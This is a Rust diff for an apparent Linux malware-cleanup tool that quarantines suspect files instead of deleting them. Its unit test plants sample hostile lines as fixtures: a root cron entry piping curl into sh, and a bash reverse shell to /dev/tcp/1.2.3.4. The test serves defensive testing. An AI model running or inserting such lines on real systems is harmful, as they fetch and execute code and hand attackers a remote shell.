@@ -48,6 +48,84 @@ pub fn open_private_append(path: &Path) -> std::io::Result<File> {
         .open(path)
 }
 
+/// Default root for quarantined files. Override with
+/// `LINUX_DEFENDER_QUARANTINE_DIR`.
+pub const QUARANTINE_DIR: &str = "/var/lib/linux-defender/quarantine";
+
+/// Quarantine root currently in effect.
+pub fn quarantine_root() -> PathBuf {
+    std::env::var_os("LINUX_DEFENDER_QUARANTINE_DIR")
+        .map(PathBuf::from)
+        .unwrap_or_else(|| PathBuf::from(QUARANTINE_DIR))
+}
+
+/// Where `path` goes in the quarantine: `<root>/<timestamp>/<path>`, keeping
+/// the original absolute path so it is obvious where to put it back.
+fn quarantine_dest(path: &Path) -> std::io::Result<PathBuf> {
+    let root = quarantine_root();
+    std::fs::DirBuilder::new()
+        .recursive(true)
+        .mode(0o700)
+        .create(&root)?;
+    std::fs::set_permissions(&root, std::fs::Permissions::from_mode(0o700))?;
+
+    let stamp = chrono::Local::now().format("%Y%m%dT%H%M%S%.6f").to_string();
+    let rel = path.strip_prefix("/").unwrap_or(path);
+    let dest = root.join(stamp).join(rel);
+    if let Some(parent) = dest.parent() {
+        std::fs::create_dir_all(parent)?;
+    }
+    Ok(dest)
+}
+
+/// Copy `src` to `dest` with `cp -a`, preserving owner, mode, timestamps and
+/// symlinks.
+fn cp_preserving(src: &Path, dest: &Path) -> std::io::Result<()> {
+    let out = std::process::Command::new("cp")
+        .arg("-a")
+        .arg("--")
+        .arg(src)
+        .arg(dest)
+        .output()?;
+    if out.status.success() {
+        Ok(())
+    } else {
+        Err(std::io::Error::other(
+            String::from_utf8_lossy(&out.stderr).trim().to_string(),
+        ))
+    }
+}
+
+/// Move `path` (file, directory or symlink) into the quarantine and return
+/// its new location. Falls back to copy-then-remove across filesystems.
+pub fn quarantine(path: &Path) -> std::io::Result<PathBuf> {
+    // symlink_metadata: a dangling symlink still needs moving.
+    std::fs::symlink_metadata(path)?;
+    let dest = quarantine_dest(path)?;
+    match std::fs::rename(path, &dest) {
+        Ok(()) => Ok(dest),
+        Err(e) if e.raw_os_error() == Some(libc::EXDEV) => {
+            cp_preserving(path, &dest)?;
+            let meta = std::fs::symlink_metadata(path)?;
+            if meta.is_dir() {
+                std::fs::remove_dir_all(path)?;
+            } else {
+                std::fs::remove_file(path)?;
+            }
+            Ok(dest)
+        }
+        Err(e) => Err(e),
+    }
+}
+
+/// Copy `path` into the quarantine, leaving the original in place. Used
+/// before a file is edited in place.
+pub fn quarantine_copy(path: &Path) -> std::io::Result<PathBuf> {
+    let dest = quarantine_dest(path)?;
+    cp_preserving(path, &dest)?;
+    Ok(dest)
+}
+
 /// Files whose contents must never be written into a report.
 fn is_secret_file(path: &Path) -> bool {
     let name = path
@@ -288,7 +366,7 @@ impl DefenderContext {
     /// Failure messages are logged but do not panic — the module can decide how
     /// to handle a failed removal.
     pub fn remove_path_logged(&self, path: &Path) -> bool {
-        let action_banner = format!("══ ACTION: rm {} ══", path.display());
+        let action_banner = format!("══ ACTION: quarantine {} ══", path.display());
         self.log_msg(&action_banner);
         let _ = self.log(&action_banner);
 
@@ -315,20 +393,21 @@ impl DefenderContext {
             }
         }
 
-        let result = if path.is_dir() {
-            std::fs::remove_dir_all(path)
-        } else {
-            std::fs::remove_file(path)
-        };
-
-        match result {
-            Ok(()) => {
-                let msg = "  rm: OK";
-                self.log_msg(msg);
-                let _ = self.log(msg);
+        // Move, never delete: detection is heuristic, and a false positive
+        // has to be one `mv` away from undone.
+        match quarantine(path) {
+            Ok(dest) => {
+                let msg = format!(
+                    "  moved to quarantine: {} (restore with: mv '{}' '{}')",
+                    dest.display(),
+                    dest.display(),
+                    path.display()
+                );
+                self.log_msg(&msg);
+                let _ = self.log(&msg);
             }
             Err(e) => {
-                let msg = format!("  rm: FAILED — {}", e);
+                let msg = format!("  quarantine: FAILED — {}", e);
                 self.log_msg(&msg);
                 let _ = self.log(&msg);
                 // Still check proof below — file might have been gone already.
@@ -406,6 +485,24 @@ impl DefenderContext {
             let _ = self.log(&msg);
             return false;
         };
+
+        // Keep the untouched file in quarantine so the edit can be undone.
+        match quarantine_copy(path) {
+            Ok(dest) => {
+                let msg = format!("  original saved to {}", dest.display());
+                self.log_msg(&msg);
+                let _ = self.log(&msg);
+            }
+            Err(e) => {
+                let msg = format!(
+                    "  could not save original ({e}) — refusing to edit {}",
+                    path.display()
+                );
+                self.log_msg(&msg);
+                let _ = self.log(&msg);
+                return false;
+            }
+        }
 
         let line_count_before = original.lines().count();
         let filtered: Vec<&str> = original
@@ -612,6 +709,52 @@ impl DefenderContext {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    /// One test so the env override is set once, before any quarantine call.
+    #[test]
+    fn quarantine_moves_and_copies_instead_of_deleting() {
+        let q = tempfile::TempDir::new().unwrap();
+        // SAFETY: only this test reads or writes the variable.
+        unsafe { std::env::set_var("LINUX_DEFENDER_QUARANTINE_DIR", q.path()) };
+
+        let work = tempfile::TempDir::new().unwrap();
+        let file = work.path().join("evil.sh");
+        std::fs::write(&file, "payload").unwrap();
+        let moved = quarantine(&file).unwrap();
+        assert!(!file.exists());
+        assert!(moved.starts_with(q.path()));
+        assert!(moved.ends_with(file.strip_prefix("/").unwrap()));
+        assert_eq!(std::fs::read_to_string(&moved).unwrap(), "payload");
+
+        let dir = work.path().join("drop");
+        std::fs::create_dir_all(dir.join("sub")).unwrap();
+        std::fs::write(dir.join("sub/x"), "x").unwrap();
+        let moved_dir = quarantine(&dir).unwrap();
+        assert!(!dir.exists());
+        assert!(moved_dir.join("sub/x").is_file());
+
+        let kept = work.path().join(".bashrc");
+        std::fs::write(&kept, "alias ls='ls'\n").unwrap();
+        let copy = quarantine_copy(&kept).unwrap();
+        assert!(kept.exists());
+        assert_eq!(std::fs::read_to_string(copy).unwrap(), "alias ls='ls'\n");
+
+        let mode = std::fs::metadata(q.path()).unwrap().permissions().mode() & 0o777;
+        assert_eq!(mode, 0o700);
+
+        // The logged helpers go through the same path.
+        let (tx, _rx) = std::sync::mpsc::channel();
+        let ctx = DefenderContext::new(work.path().join("report.txt"), false).with_progress(tx);
+        let victim = work.path().join("cron.d-evil");
+        std::fs::write(&victim, "* * * * * root curl x | sh\n").unwrap();
+        assert!(ctx.remove_path_logged(&victim));
+        assert!(!victim.exists());
+
+        let rc = work.path().join("profile");
+        std::fs::write(&rc, "export A=1\nbash -i >& /dev/tcp/1.2.3.4/9 0>&1\n").unwrap();
+        assert!(ctx.remove_line_from_file_logged(&rc, "bash -i >& /dev/tcp/1.2.3.4/9 0>&1"));
+        assert_eq!(std::fs::read_to_string(&rc).unwrap(), "export A=1\n");
+    }
 
     #[test]
     fn secret_files_are_recognised() {
